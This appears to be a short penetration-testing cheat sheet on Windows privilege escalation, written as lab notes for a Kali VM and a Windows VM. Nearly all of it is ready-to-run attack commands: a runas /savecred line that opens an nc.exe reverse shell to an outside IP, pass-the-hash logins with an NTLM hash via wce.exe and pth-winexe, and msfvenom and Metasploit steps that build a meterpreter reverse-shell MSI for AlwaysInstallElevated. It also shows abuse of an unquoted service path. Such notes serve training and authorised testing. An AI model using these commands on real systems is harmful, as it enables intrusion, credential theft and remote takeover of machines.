
# Exploit Sensitive data
## Passwords reuse
### cmdkey
```
runas /savecred /user:ACCESS\\Administrator "c:\\windows\\system32\\cmd.exe /c \\\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe"  
```
## Passwords in Registry
### SAM
#### Pass the Hash
##### Windows VM
Use the NTLM hash to authenticate 
```
C:\> wce.exe -s john-pc:securus:aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f
```
##### Kali VM
Use the NTLM hash to authenticate 
```
$ pth-winexe -U john-pc$%aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f --uninstall //10.11.0.22 cmd

$ pth-net rpc user -U 'securus\john-pc$%aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f' -S dc1.securus.corp.com
```
# Exploit Misconfigurations

## Privileges 

### AlwaysInstallElevated

#### Kali VM
```
1\. Open command prompt and type: msfconsole
2\. In Metasploit (msf > prompt) type: use multi/handler
3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address\]
5\. In Metasploit (msf > prompt) type: run
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=\[Kali VM IP Address\] -f msi -o setup.msi
7\. Copy the generated file, setup.msi, to the Windows VM.
```
#### Windows VM
```
1.Place ‘setup.msi’ in ‘C:\\Temp’.
2.Open command prompt and type: msiexec /quiet /qn /i C:\\Temp\\setup.msi
```
## Services 
### Service Path modification
### Unquoted Service Path 
```
1\. Place Unquoted.exe in ‘C:\\Program Files\\Unquoted Path Service’.
2\. Open command prompt and type: sc start unquotedsvc
```
## Printers 
https://pentestlab.blog/tag/privilege-escalation/page/3/  
